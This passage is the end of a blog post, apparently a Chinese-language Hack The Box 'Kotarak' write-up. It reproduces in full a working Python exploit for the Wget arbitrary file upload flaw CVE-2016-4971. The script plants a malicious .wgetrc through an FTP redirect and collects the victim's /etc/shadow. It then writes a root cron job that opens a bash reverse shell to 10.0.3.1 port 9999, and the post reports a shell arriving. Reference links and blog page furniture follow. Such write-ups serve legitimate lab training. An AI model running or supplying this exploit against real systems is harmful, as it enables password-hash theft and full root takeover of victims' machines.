+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Wget 1.18 &lt; Arbitrary File Upload Exploit</span></span><br><span class="line"><span class="comment"># Dawid Golunski</span></span><br><span class="line"><span class="comment"># dawid( at )legalhackers.com</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CVE-2016-4971 </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> socket;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wgetExploit</span>(<span class="params">SimpleHTTPServer.SimpleHTTPRequestHandler</span>):</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="comment"># This takes care of sending .wgetrc</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;We have a volunteer requesting &quot;</span> + self.path + <span class="string">&quot; by GET :)\n&quot;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;Wget&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers.getheader(<span class="string">&#x27;User-Agent&#x27;</span>):</span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;But it&#x27;s not a Wget :( \n&quot;</span></span><br><span class="line">          self.send_response(<span class="number">200</span>)</span><br><span class="line">          self.end_headers()</span><br><span class="line">          self.wfile.write(<span class="string">&quot;Nothing to see here...&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Uploading .wgetrc via ftp redirect vuln. It should land in /root \n&quot;</span></span><br><span class="line">       self.send_response(<span class="number">301</span>)</span><br><span class="line">       new_path = <span class="string">&#x27;%s&#x27;</span>%(<span class="string">&#x27;ftp://anonymous@%s:%s/.wgetrc&#x27;</span>%(FTP_HOST, FTP_PORT) )</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Sending redirect to %s \n&quot;</span>%(new_path)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Location&#x27;</span>, new_path)</span><br><span class="line">       self.end_headers()</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="comment"># In here we will receive extracted file and install a PoC cronjob</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;We have a volunteer requesting &quot;</span> + self.path + <span class="string">&quot; by POST :)\n&quot;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;Wget&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers.getheader(<span class="string">&#x27;User-Agent&#x27;</span>):</span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;But it&#x27;s not a Wget :( \n&quot;</span></span><br><span class="line">          self.send_response(<span class="number">200</span>)</span><br><span class="line">          self.end_headers()</span><br><span class="line">          self.wfile.write(<span class="string">&quot;Nothing to see here...&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">       content_len = <span class="built_in">int</span>(self.headers.getheader(<span class="string">&#x27;content-length&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">       post_body = self.rfile.read(content_len)</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n&quot;</span> % (post_body)</span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Sending back a cronjob script as a thank-you for the file...&quot;</span> </span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;It should get saved in /etc/cron.d/wget-root-shell on the victim&#x27;s host (because of .wgetrc we injected in the GET first response)&quot;</span></span><br><span class="line">       self.send_response(<span class="number">200</span>)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">       self.end_headers()</span><br><span class="line">       self.wfile.write(ROOT_CRON)</span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;\nFile was served. Check on /root/hacked-via-wget on the victim&#x27;s host in a minute! :) \n&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">HTTP_LISTEN_IP = <span class="string">&#x27;10.0.3.1&#x27;</span></span><br><span class="line">HTTP_LISTEN_PORT = <span class="number">80</span></span><br><span class="line">FTP_HOST = <span class="string">&#x27;10.0.3.1&#x27;</span></span><br><span class="line">FTP_PORT = <span class="number">21</span></span><br><span class="line"></span><br><span class="line">ROOT_CRON = <span class="string">&quot;* * * * * root bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.3.1/9999 0&gt;&amp;1&#x27; \n&quot;</span></span><br><span class="line"></span><br><span class="line">handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Ready? Is your FTP server running?&quot;</span></span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">result = sock.connect_ex((FTP_HOST, FTP_PORT))</span><br><span class="line"><span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;FTP found open on %s:%s. Let&#x27;s go then\n&quot;</span> % (FTP_HOST, FTP_PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;FTP is down :( Exiting.&quot;</span></span><br><span class="line">   exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Serving wget exploit on port %s...\n\n&quot;</span> % HTTP_LISTEN_PORT</span><br><span class="line"></span><br><span class="line">handler.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>过几分钟后即可在<code>9999</code>端口接收到shell</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_JOY8R6gUW9.png" class="">
+
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_iHlr_XWoQx.png" class="">
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#http---tcp-60000"  title="https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#http---tcp-60000">https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#http—tcp-60000<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40064"  title="https://www.exploit-db.com/exploits/40064">https://www.exploit-db.com/exploits/40064<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=38e-sxPWiuY&amp;t=1551s" >https://www.youtube.com/watch?v=38e-sxPWiuY&amp;t=1551s<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Oauth2.0安全问题</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;Comments</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'E3140V5fTteP8KzwJweuefl2-gzGzoHsz',
+                    appKey: 'Wo0PLY3dWpTTzUDW3Hbj6Gud',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '欢迎吐槽~',
+                    lang: 'en'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = 'p0melo';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">p0melo</a>
+        </div>
+        
+		<!--
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+		-->
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nmap"><span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8080"><span class="nav-text">8080</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8009"><span class="nav-text">8009</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#60000"><span class="nav-text">60000</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8Fwar%E5%8C%85"><span class="nav-text">上传恶意war包</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3atanas%E7%94%A8%E6%88%B7"><span class="nav-text">提权至atanas用户</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dumphash"><span class="nav-text">dumphash</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3root"><span class="nav-text">提权至root</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#10-0-3-133"><span class="nav-text">10.0.3.133</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wget%E6%BC%8F%E6%B4%9E"><span class="nav-text">wget漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-4971"><span class="nav-text">CVE-2016-4971</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
